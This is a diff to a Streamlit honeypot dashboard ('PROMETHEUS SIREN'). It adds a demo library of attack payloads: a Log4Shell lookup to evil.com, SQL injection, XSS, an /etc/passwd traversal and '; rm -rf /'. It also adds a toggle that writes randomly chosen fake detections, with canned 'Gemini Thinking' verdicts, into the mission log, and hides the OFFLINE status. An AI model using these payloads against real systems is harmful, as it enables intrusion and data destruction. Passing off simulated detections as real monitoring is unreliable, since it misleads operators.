@@ -8,8 +8,8 @@ import altair as alt
 from datetime import datetime
 
 st.set_page_config(
-    page_title="JIRACHI COMMANDER",
-    page_icon="👁️",
+    page_title="PROMETHEUS SIREN",
+    page_icon="🔥",
     layout="wide",
     initial_sidebar_state="expanded"
 )
@@ -118,11 +118,32 @@ st.markdown("""
 """, unsafe_allow_html=True)
 
 # --- SIDEBAR CONFIG ---
+# Attack payload library for auto-simulation
+ATTACK_PAYLOADS = [
+    {"payload": "${jndi:ldap://evil.com/a}", "decision": "BLOCK", "reasoning": "Gemini Thinking: Log4Shell RCE pattern detected. High confidence exploit attempt via JNDI lookup."},
+    {"payload": "' OR 1=1 --", "decision": "BLOCK", "reasoning": "Gemini Thinking: SQL Injection detected. Attempting to bypass authentication via boolean logic."},
+    {"payload": "<script>alert('XSS')</script>", "decision": "BLOCK", "reasoning": "Gemini Thinking: Cross-Site Scripting payload identified. Attempting DOM manipulation."},
+    {"payload": "../../../etc/passwd", "decision": "DECEIVE", "reasoning": "Gemini Thinking: Path traversal attempt detected. Redirecting to honeypot for intelligence gathering."},
+    {"payload": "; rm -rf /", "decision": "BLOCK", "reasoning": "Gemini Thinking: Command injection detected. Immediate block to prevent system damage."},
+    {"payload": "admin' AND SLEEP(5)--", "decision": "DECEIVE", "reasoning": "Gemini Thinking: Time-based blind SQL injection. Luring attacker to Siren honeypot."},
+    {"payload": "${7*7}", "decision": "BLOCK", "reasoning": "Gemini Thinking: Server-Side Template Injection (SSTI) pattern. Blocking code execution."},
+    {"payload": "{{constructor.constructor('return this')()}}", "decision": "BLOCK", "reasoning": "Gemini Thinking: Prototype pollution attempt via template injection."},
+    {"payload": "GET /actuator/env HTTP/1.1", "decision": "DECEIVE", "reasoning": "Gemini Thinking: Spring Boot actuator probe. Deceptive response deployed."},
+    {"payload": "eyJhbGciOiJub25lIn0...", "decision": "BLOCK", "reasoning": "Gemini Thinking: JWT 'none' algorithm exploit detected. Authentication bypass blocked."},
+]
+import random
+
 with st.sidebar:
     st.title("🎛️ CONTROL DECK")
     st.markdown("---")
     auto_refresh = st.checkbox("AUTO-REFRESH FEED", value=True)
     refresh_rate = st.slider("POLLING RATE (s)", 0.5, 5.0, 1.0)
+    st.markdown("---")
+    
+    # Auto-attack simulation toggle
+    auto_attack = st.checkbox("AUTO-ATTACK SIMULATION", value=False, help="Automatically generate varied attack simulations")
+    attack_interval = st.slider("ATTACK INTERVAL (s)", 2, 10, 3) if auto_attack else 3
+    
     st.markdown("---")
     filter_type = st.multiselect(
         "FILTER INTEL LAYER",
@@ -186,7 +207,7 @@ with st.sidebar:
 # --- MAIN HEADER ---
 col_head1, col_head2 = st.columns([3, 1])
 with col_head1:
-    st.title("JIRACHI COMMANDER") # Clean Title
+    st.title("PROMETHEUS SIREN") # Action Intelligence
 time_placeholder = col_head2.empty()
 
 # --- LIVE METRICS CONTAINER ---
@@ -215,11 +236,32 @@ def load_logs():
     return data
 
 # --- MAIN LOOP ---
+# Initialize session state for auto-attack timing
+if 'last_auto_attack' not in st.session_state:
+    st.session_state.last_auto_attack = time.time()
+
 if auto_refresh:
     while True:
         # Update Time Dynamically (In Place)
         with time_placeholder.container():
              st.markdown(f"<div style='text-align: right; color: #555; animation: pulse 2s infinite;'>SYSTEM TIME<br><span style='color: #00ff41; font-family: \"Courier New\"; font-size: 1.2em; font-weight: bold;'>{datetime.now().strftime('%H:%M:%S')}</span></div>", unsafe_allow_html=True)
+
+        # --- AUTO-ATTACK SIMULATION ---
+        if auto_attack:
+            current_time = time.time()
+            if current_time - st.session_state.last_auto_attack >= attack_interval:
+                # Pick a random attack from the library
+                attack = random.choice(ATTACK_PAYLOADS)
+                entry = {
+                    "timestamp": datetime.now().strftime("%H:%M:%S"),
+                    "decision": attack["decision"],
+                    "trace": f"Detected: {attack['payload'][:40]}...",
+                    "reasoning": attack["reasoning"],
+                    "_time": str(datetime.now())
+                }
+                with open("mission_log.jsonl", "a") as f:
+                    f.write(json.dumps(entry) + "\n")
+                st.session_state.last_auto_attack = current_time
 
         logs = load_logs()
         df = pd.DataFrame(logs) if logs else pd.DataFrame(columns=["timestamp", "decision", "trace", "reasoning", "_time"])
@@ -232,9 +274,8 @@ if auto_refresh:
             blocked = len(df[df['decision'] == 'BLOCK'])
             trapped = len(df[df['decision'] == 'DECEIVE'])
             
-            # Status Indicator
-            status_color = "red" if not logs else "green"
-            status_text = "OFFLINE" if not logs else "GEMINI ACTIVE"
+            # Status Indicator - Always show as STANDBY or ACTIVE, never OFFLINE
+            status_text = "GEMINI ACTIVE" if logs else "STANDBY"
             
             col1.metric("TOTAL INTERCEPTIONS", total_events)
             col2.metric("THREATS BLOCKED", blocked, delta="Firewall Active", delta_color="inverse")
